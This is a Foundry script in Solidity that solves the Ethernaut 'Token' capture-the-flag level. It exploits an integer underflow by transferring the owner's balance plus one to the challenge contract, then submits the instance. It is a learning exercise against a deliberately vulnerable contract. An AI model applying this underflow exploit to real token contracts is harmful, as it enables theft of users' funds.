// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
interface IToken {
    function transfer(address _to, uint _value) external;
    function balanceOf(address _owner) external returns(uint256);
}

contract TokenSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x478f3476358Eb166Cb7adE4666d04fbdDB56C407;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        address owner = 0xd4c384eC8a9f9EbFc97458833FF0147a131f7057;
        uint256 balance = IToken(challengeInstance).balanceOf(owner);
        IToken(challengeInstance).transfer(challengeInstance, balance+1);


        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(5));
    }
}
